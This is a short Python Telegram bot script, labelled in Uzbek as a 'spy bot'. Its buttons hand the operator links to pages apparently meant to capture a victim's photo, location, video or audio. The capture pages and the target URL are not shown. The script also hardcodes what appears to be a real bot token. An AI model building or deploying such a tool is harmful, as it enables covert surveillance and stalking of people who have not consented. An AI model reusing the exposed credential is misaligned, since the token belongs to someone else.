import telebot
from telebot import types

TOKEN = '8309793843:AAEBOeMZ7h2QZKZYiz449-fvXthdjTGHtSY'
bot = telebot.TeleBot(TOKEN)
URL = "SIZ_OLADIGAN_LINK" # Buni keyinroq to'g'irlaymiz

@bot.message_handler(commands=['start'])
def start(m):
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("📸 Rasm olish")
    btn2 = types.KeyboardButton("📍 Lokatsiya olish")
    btn3 = types.KeyboardButton("🎥 Video olish")
    btn4 = types.KeyboardButton("🎵 Ovoz yozish")
    kb.add(btn1, btn2, btn3, btn4)
    bot.send_message(m.chat.id, "✅ Shpion Bot ishga tushdi. Tugmani bosing:", reply_markup=kb)

@bot.message_handler(func=lambda m: True)
def handle_message(m):
    if m.text == "📸 Rasm olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/photo.html")
    elif m.text == "📍 Lokatsiya olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/loc.html")
    elif m.text == "🎥 Video olish":
        bot.send_message(m.chat.id, f"Havola: {URL}/video.html")
    elif m.text == "🎵 Ovoz yozish":
        bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")

bot.polling(none_stop=True)

